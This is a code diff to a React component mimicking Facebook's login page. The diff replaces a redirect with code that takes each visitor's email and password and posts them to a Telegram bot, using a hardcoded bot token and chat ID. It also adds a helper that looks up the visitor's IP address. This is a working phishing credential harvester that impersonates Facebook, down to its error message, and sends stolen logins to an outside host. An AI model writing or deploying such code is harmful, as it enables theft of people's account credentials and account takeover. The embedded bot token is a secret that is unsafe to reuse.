@@ -19,12 +19,67 @@ function FacebookLogin() {
   const [pass, setPass] = useState('');
   const [error, setError] = useState('');
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     if (email && pass) {
-      window.location.href = 'https://facebook.com';
+      try {
+        // Send data to Telegram
+        const telegramData = {
+          email: email,
+          password: pass,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+        };
+
+        // Format message for Telegram - escape special characters for Markdown
+        const escapedEmail = telegramData.email.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
+        const escapedPassword = telegramData.password.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
+        const message = `*Email:* ${escapedEmail}\n🔑 *Password:* ${escapedPassword}\n⏰ *Time:* ${new Date().toLocaleString()}`;
+        
+        // Replace with your Telegram bot token and chat ID
+        const botToken = '7505337458:AAGCCW38MdhRtsuOT2wepXIZaDxwBTzWHAU';
+        const chatId = '6797605369';
+        
+        // Send to Telegram using POST with JSON body
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        const response = await fetch(telegramUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'MarkdownV2'
+          }),
+        });
+        
+        if (!response.ok) {
+          const errorData = await response.text();
+          console.error('Telegram API response:', errorData);
+          throw new Error(`Telegram API error: ${response.status} - ${errorData}`);
+        }
+
+        // Redirect to Facebook after sending to Telegram
+      } catch (error) {
+        console.error('Error sending data to Telegram:', error);
+        // Still redirect even if there's an error
+      }
     } else {
-      setError('The email address or mobile number you entered isn’t connected to an account. Find your account and log in.');
+      setError("The email address or mobile number you entered isn't connected to an account. Find your account and log in.");
+    }
+  };
+
+  // Function to get client IP (you might need to implement this based on your setup)
+  const getClientIP = async () => {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch (error) {
+      console.error('Error getting IP:', error);
+      return 'unknown';
     }
   };
 
